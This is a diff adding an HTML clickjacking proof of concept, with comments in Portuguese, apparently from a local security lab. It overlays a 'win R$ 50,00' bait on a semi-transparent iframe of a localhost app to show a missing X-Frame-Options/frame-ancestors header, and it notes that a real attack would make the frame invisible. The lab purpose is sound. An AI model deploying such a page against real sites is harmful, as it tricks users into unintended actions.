@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Ganhe R$ 50,00</title>
+  <!--
+    PoC de clickjacking — imageboard-security-lab
+    Alvo: http://localhost:3000/tech
+
+    Este exploit demonstra a ausência do header X-Frame-Options (e da diretiva
+    frame-ancestors do CSP) na aplicação-alvo. Sem essas proteções, o navegador
+    permite que a aplicação seja renderizada dentro de um <iframe> controlado por
+    um terceiro, viabilizando o sequestro de cliques (clickjacking).
+
+    Uso restrito a instância local e própria, para fins de estudo.
+  -->
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 40px; }
+    .isca { font-size: 24px; color: #333; }
+
+    /*
+      O iframe abaixo carrega a aplicação-alvo em tela cheia, por cima da isca.
+      opacity: 0.3 e a borda vermelha existem apenas para tornar o ataque VISÍVEL
+      nesta demonstração — num cenário real, opacity seria 0 e a borda removida,
+      deixando a vítima ver apenas a isca enquanto interage com o site legítimo.
+    */
+    iframe {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      opacity: 0.3;
+      border: 3px solid red;
+    }
+  </style>
+</head>
+<body>
+  <div class="isca">
+    <h1>Parabéns! Clique aqui para ganhar R$ 50,00 grátis</h1>
+    <p>O clique da vítima é interceptado pela aplicação renderizada abaixo.</p>
+  </div>
+
+  <!--
+    Se X-Frame-Options (ou CSP frame-ancestors) estivesse configurado na resposta,
+    o navegador recusaria carregar este iframe e a área abaixo ficaria em branco.
+  -->
+  <iframe src="http://localhost:3000/tech"></iframe>
+</body>
+</html>
